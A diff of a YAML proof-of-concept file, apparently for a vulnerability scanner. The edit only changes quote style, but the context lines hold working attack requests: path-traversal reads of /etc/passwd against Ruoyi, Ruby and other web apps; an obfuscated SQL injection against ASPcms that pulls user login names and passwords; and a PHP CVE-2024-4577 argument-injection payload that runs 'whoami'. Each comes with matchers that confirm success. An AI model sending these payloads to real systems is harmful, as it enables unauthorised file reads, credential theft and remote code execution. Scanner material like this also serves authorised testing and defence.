@@ -8,7 +8,7 @@ pocs:
     - metch: "get"
       path: '/common/download/resource?resource=/profile/../../../../../../../../../../etc/passwd'
       body:
-        - "root:x"
+        - 'root:x'
       matchers-condition: or
       name : "Ruoyi file read"
     - metch: "get"
@@ -44,13 +44,13 @@ pocs:
     - metch: "post"
       path: '/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../etc/passwd'
       body:
-        - "root:x"
+        - 'root:x'
       matchers-condition: or
       name: "JQuery file read"
     - metch: "get"
       path: '/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user'
       body:
-        - "root:x"
+        - 'root:x'
       matchers-condition: or
       name: "ASPcms sql vuln"
     - metch: "get"
@@ -70,14 +70,14 @@ pocs:
       path: '/?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input'
       body:
         - "1337"
-      data: "whoami;echo 1337; die;"
+      data: 'whoami;echo 1337; die;'
       matchers-condition: or
       name: "PHP CVE-2024-4577 vuln"
     - metch: "get"
       path: '/assets/file:%2f%2f/etc/passwd'
       body:
-        - "/etc/passwd is no"
-        - "root:x"
+        - '/etc/passwd is no'
+        - 'root:x'
       matchers-condition: or
       name: "Ruby file read"
     - metch: "get"
@@ -104,7 +104,7 @@ pocs:
     - metch: "get"
       path: '/common/download/resource?name=/profile/../../../../../../../etc/passwd'
       body:
-        - "root:x"
+        - 'root:x'
       matchers-condition: or
       name: "Ruoyi file read"
     - metch: "get"
@@ -116,13 +116,13 @@ pocs:
     - metch: "get"
       path: '/common/download?fileName=../../../../etc/passwd&delete=false'
       body:
-        - "root:x"
+        - 'root:x'
       matchers-condition: or
       name: "Ruoyi file read"
     - metch: "get"
       path: '/common/download?delete=false&fileName=../../../../../etc/passwd'
       body:
-        - "root:x"
+        - 'root:x'
       matchers-condition: or
       name: "Ruoyi file read"
     - metch: "get"
